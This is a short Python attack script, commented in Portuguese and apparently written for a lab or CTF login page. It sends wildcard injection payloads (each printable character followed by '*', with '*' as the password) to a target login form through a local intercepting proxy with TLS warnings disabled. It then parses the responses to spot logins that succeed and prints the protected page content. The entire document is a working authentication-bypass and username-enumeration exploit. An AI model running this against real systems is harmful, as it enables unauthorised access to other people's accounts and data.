import requests
import sys
from rich import print #Cores no print
from bs4 import BeautifulSoup #Parsing de HTML
import string

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = sys.argv[1]
printables = string.printable

for char in printables: 
	data = {
		'username': f'{char}*',
		'password': '*'
	}
	response = requests.post(url, data=data, headers=headers, proxies=proxies)
	html_response = response.text # Salva a response em uma variável
	soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
	results_tag = soup.find('div', class_='alert alert-danger alert-dismissible') # Filtra pela tag HTML "script". OBS: O soup.find mostra apenas um elemento, dirente do soup.find_all que mostra todos. o .dind pode ser usado com .text, já o .find_all não.
	print(f"[bold yellow]Testing with: {char}[/bold yellow]\n")
	if results_tag and "Login failed!" in results_tag.text: # Verifica se o result_tag é NONE, caso seja, ignora e continua a verificacão seguinte, que verifica a existencia da string "Login Failed!" em results_tag.text
		print(f"[bold red]Error!![/bold red]\n")
	else:
		print(f"[bold green]Success[/bold green]\n")
		html_response = response.text # Salva a response em uma variável
		soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
		results_tag = soup.find('div', class_='wrap')
		print(f'{results_tag.text}\n')